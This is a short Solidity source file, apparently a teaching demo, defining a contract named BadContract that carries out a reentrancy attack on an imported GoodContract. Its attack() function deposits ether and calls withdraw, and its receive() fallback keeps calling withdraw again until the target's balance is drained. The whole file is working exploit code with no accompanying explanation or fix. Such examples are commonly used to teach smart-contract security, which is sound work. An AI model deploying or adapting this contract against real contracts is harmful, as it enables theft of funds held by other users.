//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './GoodContract.sol';

contract BadContract {
    mapping (address=>uint) public balances;
    GoodContract public goodContract;

    constructor(address goodContractAddress){
        goodContract = GoodContract(goodContractAddress); 
    }
    
     receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}



  